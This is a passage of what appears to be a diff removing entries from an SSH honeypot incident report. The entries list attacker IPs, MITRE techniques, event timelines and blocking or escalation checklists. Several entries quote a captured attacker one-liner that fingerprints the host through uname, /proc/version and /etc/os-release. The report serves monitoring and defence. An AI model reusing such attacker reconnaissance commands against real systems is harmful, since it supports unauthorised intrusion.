-| `2026-08-22 13:48:06` | `cowrie.direct-tcpip.ja4h` |
-| `2026-08-22 13:48:06` | `cowrie.direct-tcpip.data` |
-| `2026-08-22 13:48:06` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
-- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-79e32fefc50a
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 13:49 |
-| **Last Seen** | 2026-08-22 13:49 |
-| **Session Duration** | 3s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:49:22` | `cowrie.session.connect` |
-| `2026-08-22 13:49:22` | `cowrie.client.version` |
-| `2026-08-22 13:49:22` | `cowrie.client.kex` |
-| `2026-08-22 13:49:23` | `cowrie.login.success` |
-| `2026-08-22 13:49:25` | `cowrie.session.params` |
-| `2026-08-22 13:49:25` | `cowrie.command.input` |
-| `2026-08-22 13:49:25` | `cowrie.command.input` |
-| `2026-08-22 13:49:25` | `cowrie.command.input` |
-| `2026-08-22 13:49:25` | `cowrie.command.input` |
-| `2026-08-22 13:49:25` | `cowrie.command.input` |
-| `2026-08-22 13:49:25` | `cowrie.command.success` |
-| `2026-08-22 13:49:25` | `cowrie.command.input` |
-| `2026-08-22 13:49:25` | `cowrie.command.input` |
-| `2026-08-22 13:49:25` | `cowrie.command.input` |
-| `2026-08-22 13:49:25` | `cowrie.command.input` |
-| `2026-08-22 13:49:25` | `cowrie.log.closed` |
-| `2026-08-22 13:49:26` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-7a57270b8006
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 13:50 |
-| **Last Seen** | 2026-08-22 13:50 |
-| **Session Duration** | 3s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:50:55` | `cowrie.session.connect` |
-| `2026-08-22 13:50:55` | `cowrie.client.version` |
-| `2026-08-22 13:50:55` | `cowrie.client.kex` |
-| `2026-08-22 13:50:56` | `cowrie.login.success` |
-| `2026-08-22 13:50:58` | `cowrie.session.params` |
-| `2026-08-22 13:50:58` | `cowrie.command.input` |
-| `2026-08-22 13:50:58` | `cowrie.command.input` |
-| `2026-08-22 13:50:58` | `cowrie.command.input` |
-| `2026-08-22 13:50:58` | `cowrie.command.input` |
-| `2026-08-22 13:50:58` | `cowrie.command.input` |
-| `2026-08-22 13:50:58` | `cowrie.command.success` |
-| `2026-08-22 13:50:58` | `cowrie.command.input` |
-| `2026-08-22 13:50:58` | `cowrie.command.input` |
-| `2026-08-22 13:50:58` | `cowrie.command.input` |
-| `2026-08-22 13:50:58` | `cowrie.command.input` |
-| `2026-08-22 13:50:58` | `cowrie.log.closed` |
-| `2026-08-22 13:50:58` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-ec5920ae5eed
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `175.101.14[.]77` |
-| **First Seen** | 2026-08-22 13:50 |
-| **Last Seen** | 2026-08-22 13:51 |
-| **Session Duration** | 8s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:50:56` | `cowrie.session.connect` |
-| `2026-08-22 13:50:56` | `cowrie.client.version` |
-| `2026-08-22 13:50:56` | `cowrie.client.kex` |
-| `2026-08-22 13:50:58` | `cowrie.login.success` |
-| `2026-08-22 13:50:59` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 13:51:04` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `175.101.14[.]77` to AbuseIPDB if not already reported
-- [ ] Block `175.101.14[.]77` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-29b1cacf68c2
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `219.129.236[.]174` |
-| **First Seen** | 2026-08-22 13:51 |
-| **Last Seen** | 2026-08-22 13:51 |
-| **Session Duration** | 10s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:51:04` | `cowrie.session.connect` |
-| `2026-08-22 13:51:06` | `cowrie.client.version` |
-| `2026-08-22 13:51:06` | `cowrie.client.kex` |
-| `2026-08-22 13:51:09` | `cowrie.login.success` |
-| `2026-08-22 13:51:10` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 13:51:15` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `219.129.236[.]174` to AbuseIPDB if not already reported
-- [ ] Block `219.129.236[.]174` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-f3ebd1592b7f
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 13:52 |
-| **Last Seen** | 2026-08-22 13:52 |
-| **Session Duration** | 4s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:52:31` | `cowrie.session.connect` |
-| `2026-08-22 13:52:32` | `cowrie.client.version` |
-| `2026-08-22 13:52:32` | `cowrie.client.kex` |
-| `2026-08-22 13:52:34` | `cowrie.login.success` |
-| `2026-08-22 13:52:35` | `cowrie.session.params` |
-| `2026-08-22 13:52:35` | `cowrie.command.input` |
-| `2026-08-22 13:52:35` | `cowrie.command.input` |
-| `2026-08-22 13:52:35` | `cowrie.command.input` |
-| `2026-08-22 13:52:35` | `cowrie.command.input` |
-| `2026-08-22 13:52:35` | `cowrie.command.input` |
-| `2026-08-22 13:52:35` | `cowrie.command.success` |
-| `2026-08-22 13:52:35` | `cowrie.command.input` |
-| `2026-08-22 13:52:35` | `cowrie.command.input` |
-| `2026-08-22 13:52:35` | `cowrie.command.input` |
-| `2026-08-22 13:52:35` | `cowrie.command.input` |
-| `2026-08-22 13:52:36` | `cowrie.log.closed` |
-| `2026-08-22 13:52:36` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-2a3af14185cc
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 13:54 |
-| **Last Seen** | 2026-08-22 13:54 |
-| **Session Duration** | 3s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:54:07` | `cowrie.session.connect` |
-| `2026-08-22 13:54:07` | `cowrie.client.version` |
-| `2026-08-22 13:54:07` | `cowrie.client.kex` |
-| `2026-08-22 13:54:08` | `cowrie.login.success` |
-| `2026-08-22 13:54:10` | `cowrie.session.params` |
-| `2026-08-22 13:54:10` | `cowrie.command.input` |
-| `2026-08-22 13:54:10` | `cowrie.command.input` |
-| `2026-08-22 13:54:10` | `cowrie.command.input` |
-| `2026-08-22 13:54:10` | `cowrie.command.input` |
-| `2026-08-22 13:54:10` | `cowrie.command.input` |
-| `2026-08-22 13:54:10` | `cowrie.command.success` |
-| `2026-08-22 13:54:10` | `cowrie.command.input` |
-| `2026-08-22 13:54:10` | `cowrie.command.input` |
-| `2026-08-22 13:54:10` | `cowrie.command.input` |
-| `2026-08-22 13:54:10` | `cowrie.command.input` |
-| `2026-08-22 13:54:10` | `cowrie.log.closed` |
-| `2026-08-22 13:54:11` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-dc2b3c488690
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 13:55 |
-| **Last Seen** | 2026-08-22 13:55 |
-| **Session Duration** | 3s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:55:38` | `cowrie.session.connect` |
-| `2026-08-22 13:55:39` | `cowrie.client.version` |
-| `2026-08-22 13:55:39` | `cowrie.client.kex` |
-| `2026-08-22 13:55:40` | `cowrie.login.success` |
-| `2026-08-22 13:55:41` | `cowrie.session.params` |
-| `2026-08-22 13:55:41` | `cowrie.command.input` |
-| `2026-08-22 13:55:41` | `cowrie.command.input` |
-| `2026-08-22 13:55:41` | `cowrie.command.input` |
-| `2026-08-22 13:55:41` | `cowrie.command.input` |
-| `2026-08-22 13:55:41` | `cowrie.command.input` |
-| `2026-08-22 13:55:41` | `cowrie.command.success` |
-| `2026-08-22 13:55:41` | `cowrie.command.input` |
-| `2026-08-22 13:55:41` | `cowrie.command.input` |
-| `2026-08-22 13:55:41` | `cowrie.command.input` |
-| `2026-08-22 13:55:41` | `cowrie.command.input` |
-| `2026-08-22 13:55:41` | `cowrie.log.closed` |
-| `2026-08-22 13:55:42` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-69b2e7e751d9
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `81.237.251[.]198` |
-| **First Seen** | 2026-08-22 13:55 |
-| **Last Seen** | 2026-08-22 13:55 |
-| **Session Duration** | 5s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:55:51` | `cowrie.session.connect` |
-| `2026-08-22 13:55:51` | `cowrie.client.version` |
-| `2026-08-22 13:55:51` | `cowrie.client.kex` |
-| `2026-08-22 13:55:52` | `cowrie.login.success` |
-| `2026-08-22 13:55:52` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 13:55:57` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `81.237.251[.]198` to AbuseIPDB if not already reported
-- [ ] Block `81.237.251[.]198` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-dd9d05285485
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `106.0.166[.]123` |
-| **First Seen** | 2026-08-22 13:56 |
-| **Last Seen** | 2026-08-22 14:01 |
-| **Session Duration** | 308s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:56:00` | `cowrie.session.connect` |
-| `2026-08-22 13:56:02` | `cowrie.client.version` |
-| `2026-08-22 13:56:02` | `cowrie.client.kex` |
-| `2026-08-22 13:56:08` | `cowrie.login.success` |
-| `2026-08-22 13:56:10` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 14:01:08` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `106.0.166[.]123` to AbuseIPDB if not already reported
-- [ ] Block `106.0.166[.]123` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-8efeb1050371
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 13:57 |
-| **Last Seen** | 2026-08-22 13:57 |
-| **Session Duration** | 4s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:57:10` | `cowrie.session.connect` |
-| `2026-08-22 13:57:10` | `cowrie.client.version` |
-| `2026-08-22 13:57:10` | `cowrie.client.kex` |
-| `2026-08-22 13:57:12` | `cowrie.login.success` |
-| `2026-08-22 13:57:13` | `cowrie.session.params` |
-| `2026-08-22 13:57:13` | `cowrie.command.input` |
-| `2026-08-22 13:57:13` | `cowrie.command.input` |
-| `2026-08-22 13:57:13` | `cowrie.command.input` |
-| `2026-08-22 13:57:13` | `cowrie.command.input` |
-| `2026-08-22 13:57:13` | `cowrie.command.input` |
-| `2026-08-22 13:57:13` | `cowrie.command.success` |
-| `2026-08-22 13:57:13` | `cowrie.command.input` |
-| `2026-08-22 13:57:13` | `cowrie.command.input` |
-| `2026-08-22 13:57:13` | `cowrie.command.input` |
-| `2026-08-22 13:57:13` | `cowrie.command.input` |
-| `2026-08-22 13:57:13` | `cowrie.log.closed` |
-| `2026-08-22 13:57:14` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-c898af561b6a
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `217.60.255[.]130` |
-| **First Seen** | 2026-08-22 13:58 |
-| **Last Seen** | 2026-08-22 13:58 |
-| **Session Duration** | 2s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:58:19` | `cowrie.session.connect` |
-| `2026-08-22 13:58:19` | `cowrie.client.version` |
-| `2026-08-22 13:58:20` | `cowrie.client.kex` |
-| `2026-08-22 13:58:21` | `cowrie.login.success` |
-| `2026-08-22 13:58:21` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 13:58:21` | `cowrie.direct-tcpip.ja4h` |
-| `2026-08-22 13:58:21` | `cowrie.direct-tcpip.data` |
-| `2026-08-22 13:58:21` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
-- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-9bc503c9c617
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `217.60.255[.]130` |
-| **First Seen** | 2026-08-22 13:58 |
-| **Last Seen** | 2026-08-22 13:58 |
-| **Session Duration** | 2s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:58:25` | `cowrie.session.connect` |
-| `2026-08-22 13:58:25` | `cowrie.client.version` |
-| `2026-08-22 13:58:25` | `cowrie.client.kex` |
-| `2026-08-22 13:58:26` | `cowrie.login.success` |
-| `2026-08-22 13:58:26` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 13:58:27` | `cowrie.direct-tcpip.ja4h` |
-| `2026-08-22 13:58:27` | `cowrie.direct-tcpip.data` |
-| `2026-08-22 13:58:27` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
-- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-7bd69f0b221e
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 13:59 |
-| **Last Seen** | 2026-08-22 13:59 |
-| **Session Duration** | 3s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:59:26` | `cowrie.session.connect` |
-| `2026-08-22 13:59:26` | `cowrie.client.version` |
-| `2026-08-22 13:59:26` | `cowrie.client.kex` |
-| `2026-08-22 13:59:28` | `cowrie.login.success` |
-| `2026-08-22 13:59:29` | `cowrie.session.params` |
-| `2026-08-22 13:59:29` | `cowrie.command.input` |
-| `2026-08-22 13:59:29` | `cowrie.command.input` |
-| `2026-08-22 13:59:29` | `cowrie.command.input` |
-| `2026-08-22 13:59:29` | `cowrie.command.input` |
-| `2026-08-22 13:59:29` | `cowrie.command.input` |
-| `2026-08-22 13:59:29` | `cowrie.command.success` |
-| `2026-08-22 13:59:29` | `cowrie.command.input` |
-| `2026-08-22 13:59:29` | `cowrie.command.input` |
-| `2026-08-22 13:59:29` | `cowrie.command.input` |
-| `2026-08-22 13:59:29` | `cowrie.command.input` |
-| `2026-08-22 13:59:29` | `cowrie.log.closed` |
-| `2026-08-22 13:59:29` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-448acb639a63
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 14:01 |
-| **Last Seen** | 2026-08-22 14:01 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:01:04` | `cowrie.session.connect` |
-| `2026-08-22 14:01:04` | `cowrie.client.version` |
-| `2026-08-22 14:01:04` | `cowrie.client.kex` |
-| `2026-08-22 14:01:04` | `cowrie.login.success` |
-| `2026-08-22 14:01:05` | `cowrie.session.params` |
-| `2026-08-22 14:01:05` | `cowrie.command.input` |
-| `2026-08-22 14:01:05` | `cowrie.command.input` |
-| `2026-08-22 14:01:05` | `cowrie.command.input` |
-| `2026-08-22 14:01:05` | `cowrie.command.input` |
-| `2026-08-22 14:01:05` | `cowrie.command.input` |
-| `2026-08-22 14:01:05` | `cowrie.command.success` |
-| `2026-08-22 14:01:05` | `cowrie.command.input` |
-| `2026-08-22 14:01:05` | `cowrie.command.input` |
-| `2026-08-22 14:01:05` | `cowrie.command.input` |
-| `2026-08-22 14:01:05` | `cowrie.command.input` |
-| `2026-08-22 14:01:05` | `cowrie.log.closed` |
-| `2026-08-22 14:01:05` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-ff165e027152
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 14:03 |
-| **Last Seen** | 2026-08-22 14:03 |
-| **Session Duration** | 4s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
